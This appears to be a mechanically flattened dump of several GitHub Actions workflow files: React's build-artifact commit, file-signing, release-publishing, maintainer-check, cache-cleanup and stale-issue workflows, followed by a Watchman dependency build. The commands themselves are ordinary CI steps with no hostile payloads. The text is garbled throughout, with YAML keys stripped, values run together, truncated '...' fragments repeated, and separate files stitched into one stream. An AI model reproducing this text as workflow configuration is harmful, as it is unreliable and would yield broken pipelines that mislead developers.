rm $RENDERER_FOLDER/ReactNativeRenderer-{dev,prod,profiling}.js

# Copy eslint-plugin-react-hooks
# NOTE: This is different from www, here we include the full package
#       including package.json to include dependencies in fbsource.
mkdir "$BASE_FOLDER/tools"
cp -r build/oss-experimental/eslint-plugin-react-hooks "$BASE_FOLDER/tools"

# Move React Native version file
mv build/facebook-react-native/VERSION_NATIVE_FB ./compiled-rn/VERSION_NATIVE_FB

ls -R ./compiled-rn
name: M ... iled-rnAdd REVISION filesecho ${{ inputs.commit_sha || github.event.workflow_run.head_sha || github.sha }} >> ./compiled/facebook-www/REVISION
cp ./compiled/facebook-www/REVISION ./compiled/facebook-www/REVISION_TRANSFORMS
echo ${{ inputs.commit_sha || github.event.workflow_run.head_sha || github.sha }} >> ./compiled-rn/facebook-fbsource/xplat/js/react-native-github/Libraries/Renderer/REVISION
name: A ... N filesGet current version string"Get cu ... string"get_current_versionVERSION_CLASSIC=$(cat ./compiled/facebook-www/VERSION_CLASSIC)
VERSION_MODERN=$(cat ./compiled/facebook-www/VERSION_MODERN)
VERSION_NATIVE_FB=$(cat ./compiled-rn/VERSION_NATIVE_FB)
echo "Current classic version is $VERSION_CLASSIC"
echo "Current modern version is $VERSION_MODERN"
echo "Current rn version is $VERSION_NATIVE_FB"
echo "current_version_classic=$VERSION_CLASSIC" >> "$GITHUB_OUTPUT"
echo "current_version_modern=$VERSION_MODERN" >> "$GITHUB_OUTPUT"
echo "current_version_rn=$VERSION_NATIVE_FB" >> "$GITHUB_OUTPUT"
name: " ... string"compiledcompiled/name: compiledcompiled-rncompiled-rn/name: compiled-rncommit_www_artifacts[downlo ... ifacts]inputs.force == true || (github.ref == 'refs/heads/main' && needs.process_artifacts.outputs.www_branch_count == '0')inputs. ... == '0')Ensure clean directoryrm -rf compiledRevert version changesRevert  ... changesneeds.process_artifacts.outputs.last_version_classic != '' && needs.process_artifacts.outputs.last_version_modern != ''needs.p ... n != ''CURRENT_VERSION_CLASSICCURRENT ... CLASSIC${{ needs.process_artifacts.outputs.current_version_classic }}${{ nee ... ssic }}CURRENT_VERSION_MODERNCURRENT ... _MODERN${{ needs.process_artifacts.outputs.current_version_modern }}${{ nee ... dern }}LAST_VERSION_CLASSIC${{ needs.process_artifacts.outputs.last_version_classic }}LAST_VERSION_MODERN${{ needs.process_artifacts.outputs.last_version_modern }}CURRENT ... ssic }}echo "Reverting $CURRENT_VERSION_CLASSIC to $LAST_VERSION_CLASSIC"
grep -rl "$CURRENT_VERSION_CLASSIC" ./compiled || echo "No files found with $CURRENT_VERSION_CLASSIC"
grep -rl "$CURRENT_VERSION_CLASSIC" ./compiled | xargs -r sed -i -e "s/$CURRENT_VERSION_CLASSIC/$LAST_VERSION_CLASSIC/g"
grep -rl "$CURRENT_VERSION_CLASSIC" ./compiled || echo "Classic version reverted"
echo "===================="
echo "Reverting $CURRENT_VERSION_MODERN to $LAST_VERSION_MODERN"
grep -rl "$CURRENT_VERSION_MODERN" ./compiled || echo "No files found with $CURRENT_VERSION_MODERN"
grep -rl "$CURRENT_VERSION_MODERN" ./compiled | xargs -r sed -i -e "s/$CURRENT_VERSION_MODERN/$LAST_VERSION_MODERN/g"
grep -rl "$CURRENT_VERSION_MODERN" ./compiled || echo "Modern version reverted"
Check for changesinputs.force != truecheck_should_commitecho "Full git status"
git add .
git status
echo "===================="
if git status --porcelain | grep -qv '/REVISION'; then
  echo "Changes detected"
  echo "===== Changes ====="
  git --no-pager diff -U0 | grep '^[+-]' | head -n 50
  echo "==================="
  echo "should_commit=true" >> "$GITHUB_OUTPUT"
else
  echo "No Changes detected"
  echo "should_commit=false" >> "$GITHUB_OUTPUT"
fi
name: C ... changesRe-apply version changesRe-appl ... changesinputs.force == true || (steps.check_should_commit.outputs.should_commit == 'true' && needs.process_artifacts.outputs.last_version_classic != '' && needs.process_artifacts.outputs.last_version_modern != '')inputs. ...  != '')echo "Re-applying $LAST_VERSION_CLASSIC to $CURRENT_VERSION_CLASSIC"
grep -rl "$LAST_VERSION_CLASSIC" ./compiled || echo "No files found with $LAST_VERSION_CLASSIC"
grep -rl "$LAST_VERSION_CLASSIC" ./compiled | xargs -r sed -i -e "s/$LAST_VERSION_CLASSIC/$CURRENT_VERSION_CLASSIC/g"
grep -rl "$LAST_VERSION_CLASSIC" ./compiled || echo "Classic version re-applied"
echo "===================="
echo "Re-applying $LAST_VERSION_MODERN to $CURRENT_VERSION_MODERN"
grep -rl "$LAST_VERSION_MODERN" ./compiled || echo "No files found with $LAST_VERSION_MODERN"
grep -rl "$LAST_VERSION_MODERN" ./compiled | xargs -r sed -i -e "s/$LAST_VERSION_MODERN/$CURRENT_VERSION_MODERN/g"
grep -rl "$LAST_VERSION_MODERN" ./compiled || echo "Classic version re-applied"
Will commit these changesWill co ... changesinputs.force == true || steps.check_should_commit.outputs.should_commit == 'true'inputs. ...  'true'git add .
git status
name: W ... changesCheck commit messageinputs.dry_rungit fetch origin --quiet
git show ${{ inputs.commit_sha || github.event.workflow_run.head_sha || github.sha }} --no-patch --pretty=format:"%B"
name: C ... messageCommit changes to branchCommit  ...  branchgit config --global user.email "${{ format('{0}@users.noreply.github.com', github.triggering_actor) }}"
git config --global user.name "${{ github.triggering_actor }}"

git fetch origin --quiet
git commit -m "$(git show ${{ inputs.commit_sha || github.event.workflow_run.head_sha || github.sha }} --no-patch --pretty=format:'%B%n%nDiffTrain build for [${{ inputs.commit_sha || github.event.workflow_run.head_sha || github.sha }}](https://github.com/facebook/react/commit/${{ inputs.commit_sha || github.event.workflow_run.head_sha || github.sha}})')" || echo "No changes to commit"
name: C ...  branchPush changes to branchPush ch ...  branchinputs.dry_run == false && (inputs.force == true || steps.check_should_commit.outputs.should_commit == 'true')inputs. ... 'true')needs:  ... ifacts]commit_fbsource_artifactscommit_ ... tifactsinputs.force == true || (github.ref == 'refs/heads/main' && needs.process_artifacts.outputs.fbsource_branch_count == '0')rm -rf compiled-rnneeds.process_artifacts.outputs.last_version_rn != ''CURRENT_VERSION${{ needs.process_artifacts.outputs.current_version_rn }}${{ nee ... n_rn }}LAST_VERSION${{ needs.process_artifacts.outputs.last_version_rn }}CURRENT ... n_rn }}echo "Reverting $CURRENT_VERSION to $LAST_VERSION"
grep -rl "$CURRENT_VERSION" ./compiled-rn || echo "No files found with $CURRENT_VERSION"
grep -rl "$CURRENT_VERSION" ./compiled-rn | xargs -r sed -i -e "s/$CURRENT_VERSION/$LAST_VERSION/g"
grep -rl "$CURRENT_VERSION" ./compiled-rn || echo "Version reverted"
inputs.force != 'true'echo "Full git status"
git add .
git --no-pager diff -U0 --cached | grep '^[+-]' | head -n 100
echo "===================="
# Ignore REVISION or lines removing @generated headers.
if git diff --cached ':(exclude)*REVISION' ':(exclude)*/eslint-plugin-react-hooks/package.json' | grep -vE "^(@@|diff|index|\-\-\-|\+\+\+|\- \* @generated SignedSource)" | grep "^[+-]" > /dev/null; then
  echo "Changes detected"
  echo "===== Changes ====="
  git --no-pager diff --cached ':(exclude)*REVISION' ':(exclude)*/eslint-plugin-react-hooks/package.json' | grep -vE "^(@@|diff|index|\-\-\-|\+\+\+|\- \* @generated SignedSource)" | grep "^[+-]" | head -n 50
  echo "==================="
  echo "should_commit=true" >> "$GITHUB_OUTPUT"
else
  echo "No Changes detected"
  echo "should_commit=false" >> "$GITHUB_OUTPUT"
fi
inputs.force == true || (steps.check_should_commit.outputs.should_commit == 'true' && needs.process_artifacts.outputs.last_version_rn != '')echo "Re-applying $LAST_VERSION to $CURRENT_VERSION"
grep -rl "$LAST_VERSION" ./compiled-rn || echo "No files found with $LAST_VERSION"
grep -rl "$LAST_VERSION" ./compiled-rn | xargs -r sed -i -e "s/$LAST_VERSION/$CURRENT_VERSION/g"
grep -rl "$LAST_VERSION" ./compiled-rn || echo "Version re-applied"
Add files for signingAdd fil ... signingecho ":"
git add .
name: A ... signingSigning files// TODO: Move this to a script file.
// We currently can't call scripts from the repo because
// at this point in the workflow, we're on the compiled
// artifact branch (so the scripts don't exist).
// We can fix this with a composite action in the main repo.
// This script is duplicated above.
const fs = require('fs');
const crypto = require('crypto');
const {execSync} = require('child_process');

// TODO: when we move this to a script, we can use this from npm.
// Copy of signedsource since we can't install deps on this branch.
const GENERATED = '@' + 'generated';
const NEWTOKEN = '<<SignedSource::*O*zOeWoEQle#+L!plEphiEmie@IsG>>';
const PATTERN = new RegExp(`${GENERATED} (?:SignedSource<<([a-f0-9]{32})>>)`);

const TokenNotFoundError = new Error(
  `SignedSource.signFile(...): Cannot sign file without token: ${NEWTOKEN}`
);

function hash(data, encoding) {
  const md5sum = crypto.createHash('md5');
  md5sum.update(data, encoding);
  return md5sum.digest('hex');
}

const SignedSource = {
  getSigningToken() {
    return `${GENERATED} ${NEWTOKEN}`;
  },
  isSigned(data) {
    return PATTERN.exec(data) != null;
  },
  signFile(data) {
    if (!data.includes(NEWTOKEN)) {
      if (SignedSource.isSigned(data)) {
        // Signing a file that was previously signed.
       data = data.replace(PATTERN, SignedSource.getSigningToken());
      } else {
        throw TokenNotFoundError;
      }
    }
    return data.replace(NEWTOKEN, `SignedSource<<${hash(data, 'utf8')}>>`);
  },
};

const directory = './compiled-rn';
console.log('Signing files in directory:', directory);
try {
  const result = execSync(`git status --porcelain ${directory}`, {encoding: 'utf8'});
  console.log(result);

  // Parse the git status output to get file paths!
  const files = result.split('\n').filter(file => file.endsWith('.js'));

  if (files.length === 0) {
    throw new Error(
      'git status returned no files to sign. this job should not have run.'
    );
  } else {
    files.forEach(line => {
      let file = null;
      if (line.startsWith('D ')) {
        return;
      } else if (line.startsWith('R ')) {
        file = line.slice(line.indexOf('->') + 3);
      } else {
        file = line.slice(3).trim();
      }
      if (file) {
        console.log('  Signing file:', file);
        const originalContents = fs.readFileSync(file, 'utf8');
        const signedContents = SignedSource.signFile(
          originalContents
            // Need to add the header in, since it's not inserted at build time.
            .replace(' */\n', ` * ${SignedSource.getSigningToken()}\n */\n`)
        );

        fs.writeFileSync(file, signedContents, 'utf8');
      }
    });
  }
} catch (e) {
  process.exitCode = 1;
  console.error('Error signing files:', e);
}
name: Signing filesdownload_artifacts:name: ( ... urce V2/home/huawei/github-actions-security/.github/workflows/facebook_react__runtime_discord_notify.yml(Runtime) Discord Notify(Runtim ...  Notify${{ secrets.DISCORD_WEBHOOK_URL }}/home/huawei/github-actions-security/.github/workflows/facebook_react__runtime_eslint_plugin_e2e.yml(Runtime) ESLint Plugin E2E(Runtim ... gin E2EESLint v${{ matrix.eslint_major }}ESLint  ... ajor }}eslint_major"6""7""8""9"- "6"eslint_major:runtime-and-compiler-eslint_e2e-node_modules-v6-${{ runner.arch }}-${{ runner.os }}-${{ hashFiles('yarn.lock', 'compiler/yarn.lock', 'fixtures/eslint-v*/yarn.lock') }}Install fixture dependencies./fixtures/eslint-v${{ matrix.eslint_major }}./fixtu ... ajor }}yarn --frozen-lockfileBuild pluginfixtures/eslint-v${{ matrix.eslint_major }}fixture ... ajor }}node build.mjsname: Build pluginRun lint testyarn lintname: Run lint testname: E ... ajor }}name: ( ... gin E2E/home/huawei/github-actions-security/.github/workflows/facebook_react__runtime_fuzz_tests.yml(Runtime) Fuzz testscron: 0 * * * *- cron: 0 * * * *test_fuzzactions/checkout@v4.1.0actions ... @v4.1.0uses: a ... @v4.1.0ELECTRON_SKIP_BINARY_DOWNLOADELECTRO ... OWNLOAD"1"ELECTRO ... AD: "1"Run fuzz testsFUZZ_TEST_SEED=$RANDOM yarn test fuzz --ci
FUZZ_TEST_SEED=$RANDOM yarn test --prod fuzz --ciname: Run fuzz tests- uses: ... @v4.1.0test_fuzz:name: ( ... z tests/home/huawei/github-actions-security/.github/workflows/facebook_react__runtime_prereleases.yml(Runtime) Publish Prereleases(Runtim ... eleasesenableFailureNotificationenableF ... icationWhether to notify the team on Discord when the release fails. Useful if this workflow is called from an automation.'Whethe ... ation.'descrip ... ation.'DISCORD_WEBHOOK_URLDiscord webhook URL to notify on failure. Only required if enableFailureNotification is true.'Discor ...  true.'descrip ...  true.'DISCORD_WEBHOOK_URL:GH_TOKEN=${{ secrets.GH_TOKEN }} scripts/release/prepare-release-from-ci.js --skipTests -r ${{ inputs.release_channel }} --commit=${{ inputs.commit_sha }}
cp ./scripts/release/ci-npmrc ~/.npmrc
scripts/release/publish.js --ci --tags ${{ inputs.dist_tag }}
Notify Discord on failureNotify  ... failurefailure() && inputs.enableFailureNotification == truefailure ... == trueGitHub Actions"GitHub Actions"Publish of $${{ inputs.release_channel }} release failed'Publis ... failed'${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}/attempts/${{ github.run_attempt }}${{ git ... empt }}name: N ... failure/home/huawei/github-actions-security/.github/workflows/facebook_react__runtime_prereleases_manual.yml(Runtime) Publish Prereleases Manual(Runtim ...  Manualpublish_prerelease_canarypublish ... _canaryPublish to Canary channelfacebook/react/.github/workflows/runtime_prereleases.yml@main${{ inputs.prerelease_commit_sha }}${{ inp ... _sha }}canary,nextcommit_ ... _sha }}publish ... canary:/home/huawei/github-actions-security/.github/workflows/facebook_react__runtime_prereleases_nightly.yml(Runtime) Publish Prereleases Nightly(Runtim ... NightlyDISCORD ... _URL }}/home/huawei/github-actions-security/.github/workflows/facebook_react__runtime_releases_from_npm_manual.yml(Runtime) Publish Releases from NPM Manualversion_to_promoteCurrent npm version (non-experimental) to promoteCurrent ... promoteversion_to_publishVersion to publish for the specified packagesVersion ... ackagesonly_packagesPackages to publish (space separated)Package ... arated)descrip ... arated)skip_packagesPackages to NOT publish (space separated)NPM tags (space separated)NPM tag ... arated)untaggeddryDry run instead of publish?Dry run ... ublish?force_notifyForce a Discord notification?Force a ... cation?descrip ... cation?version_to_promote:${{ inputs.force_notify || inputs.dry == false || inputs.dry == 'false' }}${{ inp ... lse' }}${{ github.event.sender.login }}${{ github.event.sender.html_url }}${{ github.event.sender.avatar_url }}âš ï¸ Publishing release from NPM${{ (inputs.dry && ' (dry run)') || '' }}"\u26a0\ufe0f Pub ...  '' }}"```json
${{ toJson(inputs) }}
```
https://github.com/facebook/react/actions/runs/${{ github.run_id }}https:/ ... n_id }}if: ${{ ... lse' }}Publish releasescp ./scripts/release/ci-npmrc ~/.npmrccp ./sc ... /.npmrcrun: cp ... /.npmrc${{ inputs.only_packages }}'${{ in ... ges }}'Prepare ${{ inputs.only_packages }} from NPM'Prepar ... om NPM'scripts/release/prepare-release-from-npm.js \
  --ci \
  --skipTests \
  --version=${{ inputs.version_to_promote }} \
  --publishVersion=${{ inputs.version_to_publish }} \
  --onlyPackages=${{ inputs.only_packages }}
if: '${ ... ges }}'${{ inputs.skip_packages }}Prepare all packages EXCEPT ${{ inputs.skip_packages }} from NPMscripts/release/prepare-release-from-npm.js \
  --ci \
  --skipTests \
  --version=${{ inputs.version_to_promote }} \
  --publishVersion=${{ inputs.version_to_publish }} \
  --skipPackages=${{ inputs.skip_packages }}
Check prepared filesls -R build/node_modulesls -R b ... modulesname: C ... d filesPublish ${{ inputs.only_packages }}'Publis ... ges }}'scripts/release/publish.js \
  --ci \
  --tags=${{ inputs.tags }} \
  --publishVersion=${{ inputs.version_to_publish }} \
  --onlyPackages=${{ inputs.only_packages }} ${{ (inputs.dry && '') || '\'}}
  ${{ inputs.dry && '--dry'}}
Publish all packages EXCEPT ${{ inputs.skip_packages }}scripts/release/publish.js \
  --ci \
  --tags=${{ inputs.tags }} \
  --publishVersion=${{ inputs.version_to_publish }} \
  --skipPackages=${{ inputs.skip_packages }} ${{ (inputs.dry && '') || '\'}}
  ${{ inputs.dry && '--dry'}}
Archive released package for debuggingArchive ... bugging./build/node_modules
name: A ... buggingname: P ... eleasesnotify:/home/huawei/github-actions-security/.github/workflows/facebook_react__shared_check_maintainer.yml(Shared) Check maintainer(Shared ... ntaineractor:is_core_team${{ jobs.check_maintainer.outputs.is_core_team }}${{ job ... team }}value:  ... team }}is_core_team:${{ steps.check_if_actor_is_maintainer.outputs.result }}is_core ... sult }}Check if actor is maintainerCheck i ... ntainercheck_if_actor_is_maintainercheck_i ... ntainerconst fs = require('fs');
const actor = '${{ inputs.actor }}';
const res = await github.rest.repos.getContent({
  owner: 'facebook',
  repo: 'react',
  path: 'MAINTAINERS',
  ref: 'main',
  headers: { Accept: 'application/vnd.github+json' }
});
if (res.status !== 200) {
  console.error(res);
  throw new Error('Unable to fetch MAINTAINERS file');
}
content = Buffer.from(res.data.content, 'base64').toString();
if (content == null || typeof content !== 'string') {
  throw new Error('Unable to retrieve MAINTAINERS file');
}

const maintainers = new Set(content.split('\n'));
if (maintainers.has(actor)) {
  console.log(`ðŸŸ¢ ${actor} is a maintainer`);
  return true;
}
console.log(`ðŸ”´ ${actor} is NOT a maintainer`);
return null;
name: C ... ntainer- name: ... ntainercheck_maintainer:name: ( ... ntainer/home/huawei/github-actions-security/.github/workflows/facebook_react__shared_cleanup_merged_branch_caches.yml(Shared) Cleanup Merged Branch Caches(Shared ...  Caches- closedpr_numberpr_number:cleanupactions: writeCleanupecho "Fetching list of cache key"
cacheKeysForPR=$(gh cache list --ref $BRANCH --limit 100 --json id --jq '.[].id')

## Setting this to not fail the workflow while deleting cache keys.
set +e
for cacheKey in $cacheKeysForPR
do
    gh cache delete $cacheKey
    echo "Deleting $cacheKey"
done
echo "Done"
${{ github.repository }}${{ git ... tory }}BRANCHrefs/pull/${{ inputs.pr_number || github.event.pull_request.number }}/mergerefs/pu ... }/mergename: Cleanup- name: Cleanupcleanup:name: ( ...  Caches/home/huawei/github-actions-security/.github/workflows/facebook_react__shared_cleanup_stale_branch_caches.yml(Shared) Cleanup Stale Branch Caches0 */6 * * *cron: 0 */6 * * *- cron: 0 */6 * * *echo "Fetching list of cache keys"
cacheKeysForPR=$(gh cache list --limit 100 --json id,ref --jq '.[] | select(.ref != "refs/heads/main") | .id')

## Setting this to not fail the workflow while deleting cache keys.
set +e
for cacheKey in $cacheKeysForPR
do
    gh cache delete $cacheKey
    echo "Deleting $cacheKey"
done
echo "Done"
/home/huawei/github-actions-security/.github/workflows/facebook_react__shared_close_direct_sync_branch_prs.yml(Shared) Close Direct Sync Branch PRs(Shared ... nch PRsbuilds/facebook-**'builds/facebook-**'- 'buil ... ook-**'close_prClose PRconst owner = context.repo.owner;
const repo = context.repo.repo;
const pullNumber = ${{ github.event.number }};

await github.rest.pulls.createReview({
  owner,
  repo,
  pull_number: pullNumber,
  body: 'Do not land changes to `${{ github.event.pull_request.base.ref }}`. Please re-open your PR targeting `main` instead.',
  event: 'REQUEST_CHANGES'
});
await github.rest.pulls.update({
  owner,
  repo,
  pull_number: pullNumber,
  state: 'closed'
});
name: Close PR- name: Close PRclose_pr:name: ( ... nch PRs/home/huawei/github-actions-security/.github/workflows/facebook_react__shared_label_core_team_prs.yml(Shared) Label Core Team PRs(Shared ... eam PRsLabel PR as React Core TeamLabel P ... re Teamgithub.rest.issues.addLabels({
  owner: context.repo.owner,
  repo: context.repo.repo,
  issue_number: ${{ github.event.number }},
  labels: ['React Core Team']
});
name: L ... re Team- name: ... re Teamname: ( ... eam PRs/home/huawei/github-actions-security/.github/workflows/facebook_react__shared_lint.yml(Shared) LintprettierRun prettiershared-lint-node_modules-v6-${{ runner.arch }}-${{ runner.os }}-${{ hashFiles('**/yarn.lock') }}shared- ... ck') }}yarn prettier-checkrun: ya ... r-checkname: Run prettiereslintRun eslintnode ./scripts/tasks/eslintnode ./ ... /eslintrun: no ... /eslintname: Run eslintcheck_licenseCheck license./scripts/ci/check_license.sh./scrip ... ense.shrun: ./ ... ense.shname: Check licensetest_print_warningsTest print warnings./scripts/ci/test_print_warnings.sh./scrip ... ings.shrun: ./ ... ings.shname: T ... arningsprettier:name: (Shared) Lint/home/huawei/github-actions-security/.github/workflows/facebook_react__shared_stale.yml(Shared) Manage stale issues and PRs(Shared ... and PRs'0 * * * *'cron: '0 * * * *'- cron: '0 * * * *'100Resolution: Stale"Resolution: Stale"This issue has been automatically marked as stale. **If this issue is still affecting you, please leave any comment** (for example, "bump"), and we'll keep it open. We are sorry that we haven't been able to prioritize it yet. If you have any new additional information, please include it with your comment!
Closing this issue after a prolonged period of inactivity. If this issue is still present in the latest release, please create a new issue with up-to-date information. Thank you!
Partner,React Core Team,Resolution: Backlog,Type: Bug,Type: Discussion,Type: Needs Investigation,Type: Regression,Type: Feature Request,Type: Enhancement"Partne ... cement"This pull request has been automatically marked as stale. **If this pull request is still relevant, please leave any comment** (for example, "bump"), and we'll keep it open. We are sorry that we haven't been able to prioritize reviewing it yet. Your contribution is very much appreciated.
Closing this pull request after a prolonged period of inactivity. If this issue is still present in the latest release, please ask for this pull request to be reopened. Thank you!
days-be ... ale: 90name: ( ... and PRs/home/huawei/github-actions-security/.github/workflows/facebook_watchman__getdeps_linux.ymlsudo --preserve-env=http_proxy python3 build/fbcode_builder/getdeps.py --allow-system-packages install-system-deps --recursive watchman && sudo --preserve-env=http_proxy python3 build/fbcode_builder/getdeps.py --allow-system-packages install-system-deps --recursive patchelfpython3 build/fbcode_builder/getdeps.py --allow-system-packages query-paths --recursive --src-dir=. watchman  >> "$GITHUB_OUTPUT"Install Rust Stablename: I ...  StableFetch cpptoml${{ steps.paths.outputs.cpptoml_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests cpptomlpython3 ... cpptomlname: Fetch cpptomlFetch xxhash${{ steps.paths.outputs.xxhash_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests xxhashpython3 ...  xxhashname: Fetch xxhashFetch pcre2${{ steps.paths.outputs.pcre2_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests pcre2python3 ... s pcre2name: Fetch pcre2Fetch python-setuptoolsFetch p ... uptools${{ steps.paths.outputs.python-setuptools_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests python-setuptoolspython3 ... uptoolsname: F ... uptoolsFetch liboqs${{ steps.paths.outputs.liboqs_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests liboqspython3 ...  liboqsname: Fetch liboqsFetch folly${{ steps.paths.outputs.folly_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests follypython3 ... s follyname: Fetch follyFetch fizz${{ steps.paths.outputs.fizz_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests fizzpython3 ... ts fizzname: Fetch fizzFetch mvfst${{ steps.paths.outputs.mvfst_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests mvfstpython3 ... s mvfstname: Fetch mvfstFetch wangle${{ steps.paths.outputs.wangle_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests wanglepython3 ...  wanglename: Fetch wangleFetch fbthrift${{ steps.paths.outputs.fbthrift_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests fbthriftpython3 ... bthriftname: Fetch fbthriftFetch fb303${{ steps.paths.outputs.fb303_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests fb303python3 ... s fb303name: Fetch fb303Fetch edencommon${{ steps.paths.outputs.edencommon_SOURCE }}python3 build/fbcode_builder/getdeps.py --allow-system-packages fetch --no-tests edencommonpython3 ... ncommonname: F ... ncommonpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests boostpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests ninjapython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests cmakeRestore cpptoml from cacherestore_cpptoml${{ steps.paths.outputs.cpptoml_INSTALL }}${{ steps.paths.outputs.cpptoml_CACHE_KEY }}-installBuild cpptoml${{ steps.paths.outputs.cpptoml_SOURCE && ! steps.restore_cpptoml.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests cpptomlname: Build cpptomlSave cpptoml to cacheSave cp ... o cachepython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests fmtpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests gflagspython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests glogpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests googletestRestore xxhash from cacherestore_xxhash${{ steps.paths.outputs.xxhash_INSTALL }}${{ steps.paths.outputs.xxhash_CACHE_KEY }}-installBuild xxhash${{ steps.paths.outputs.xxhash_SOURCE && ! steps.restore_xxhash.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests xxhashname: Build xxhashSave xxhash to cachepython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests zstdpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests double-conversionpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests fast_floatpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests libdwarfpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests libeventpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests lz4python3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests snappyRestore pcre2 from cacherestore_pcre2${{ steps.paths.outputs.pcre2_INSTALL }}${{ steps.paths.outputs.pcre2_CACHE_KEY }}-installBuild pcre2${{ steps.paths.outputs.pcre2_SOURCE && ! steps.restore_pcre2.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests pcre2name: Build pcre2Save pcre2 to cacheRestore python-setuptools from cacherestore_python-setuptoolsrestore ... uptools${{ steps.paths.outputs.python-setuptools_INSTALL }}${{ steps.paths.outputs.python-setuptools_CACHE_KEY }}-installBuild python-setuptoolsBuild p ... uptools${{ steps.paths.outputs.python-setuptools_SOURCE && ! steps.restore_python-setuptools.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests python-setuptoolsname: B ... uptoolsSave python-setuptools to cacheSave py ... o cachepython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests zlibpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests opensslRestore liboqs from cacherestore_liboqs${{ steps.paths.outputs.liboqs_INSTALL }}${{ steps.paths.outputs.liboqs_CACHE_KEY }}-installBuild liboqs${{ steps.paths.outputs.liboqs_SOURCE && ! steps.restore_liboqs.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests liboqsname: Build liboqsSave liboqs to cachepython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests autoconfpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests automakepython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests libtoolpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests libsodiumpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests libibertypython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests libunwindpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests xzRestore folly from cacherestore_folly${{ steps.paths.outputs.folly_INSTALL }}${{ steps.paths.outputs.folly_CACHE_KEY }}-install${{ steps.paths.outputs.folly_SOURCE && ! steps.restore_folly.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests follySave folly to cacheRestore fizz from cacherestore_fizz${{ steps.paths.outputs.fizz_INSTALL }}${{ steps.paths.outputs.fizz_CACHE_KEY }}-installBuild fizz${{ steps.paths.outputs.fizz_SOURCE && ! steps.restore_fizz.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests fizzname: Build fizzSave fizz to cacheRestore mvfst from cacherestore_mvfst${{ steps.paths.outputs.mvfst_INSTALL }}${{ steps.paths.outputs.mvfst_CACHE_KEY }}-installBuild mvfst${{ steps.paths.outputs.mvfst_SOURCE && ! steps.restore_mvfst.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests mvfstname: Build mvfstSave mvfst to cacheRestore wangle from cacherestore_wangle${{ steps.paths.outputs.wangle_INSTALL }}${{ steps.paths.outputs.wangle_CACHE_KEY }}-installBuild wangle${{ steps.paths.outputs.wangle_SOURCE && ! steps.restore_wangle.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests wanglename: Build wangleSave wangle to cacheRestore fbthrift from cacherestore_fbthrift${{ steps.paths.outputs.fbthrift_INSTALL }}${{ steps.paths.outputs.fbthrift_CACHE_KEY }}-installBuild fbthrift${{ steps.paths.outputs.fbthrift_SOURCE && ! steps.restore_fbthrift.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests fbthriftname: Build fbthriftSave fbthrift to cacheSave fb ... o cacheRestore fb303 from cacherestore_fb303${{ steps.paths.outputs.fb303_INSTALL }}${{ steps.paths.outputs.fb303_CACHE_KEY }}-installBuild fb303${{ steps.paths.outputs.fb303_SOURCE && ! steps.restore_fb303.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests fb303name: Build fb303Save fb303 to cacheRestore edencommon from cacherestore_edencommon${{ steps.paths.outputs.edencommon_INSTALL }}${{ steps.paths.outputs.edencommon_CACHE_KEY }}-installBuild edencommon${{ steps.paths.outputs.edencommon_SOURCE && ! steps.restore_edencommon.outputs.cache-hit }}python3 build/fbcode_builder/getdeps.py --allow-system-packages build --no-tests edencommonname: B ... ncommonSave edencommon to cacheSave ed ... o cacheBuild watchmanpython3 build/fbcode_builder/getdeps.py --allow-system-packages build --src-dir=. watchman  --project-install-prefix watchman:/usr/localname: Build watchmanpython3 build/fbcode_builder/getdeps.py --allow-system-packages fixup-dyn-deps --strip --src-dir=. watchman _artifacts/linux  --project-install-prefix 